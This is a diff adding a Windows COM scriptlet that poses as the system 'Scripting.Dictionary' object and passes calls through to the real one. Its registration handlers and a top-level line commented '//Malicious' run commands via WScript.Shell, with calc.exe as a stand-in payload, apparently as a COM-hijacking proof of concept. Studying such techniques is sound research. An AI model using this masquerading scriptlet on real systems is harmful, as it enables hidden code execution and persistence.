@@ -1,0 +1,77 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Scripting.Dictionary"
+    progid="Scripting.Dictionary"
+    version="1"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+	
+	<script language="JScript">
+<![CDATA[
+	
+
+	function Register()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	}
+	function Unregister()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
+	}
+	
+	
+]]>
+</script>
+</registration>
+
+<public>
+    <method name="Add">
+		<parameter name="a"/>
+		<parameter name="b"/>
+	</method>
+	<method name="Exists">
+		<parameter name="a"/>
+	</method>
+	<property name="myProperty" get="getSubroutineName" put="putSubroutineName"/>
+	
+</public>
+<script language="JScript">
+<![CDATA[
+  
+	var MyProperty = GetObject("clsid:EE09B103-97E0-11CF-978F-00A02463E06F");
+  
+	function getSubroutineName()
+	{
+		return MyProperty;
+	}
+	
+	function putSubroutineName()
+	{
+		
+	}
+  
+	function Add(a, b)
+	{
+		MyProperty.Add(a,b);
+	}
+	
+	function Exists(a)
+	{
+		MyProperty.Exists(a);
+	}
+	
+	function Items()
+	{
+		return MyProperty.Items();
+	}
+	
+	//Malicious 
+	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+  	
+]]>
+</script>
+
+</scriptlet>
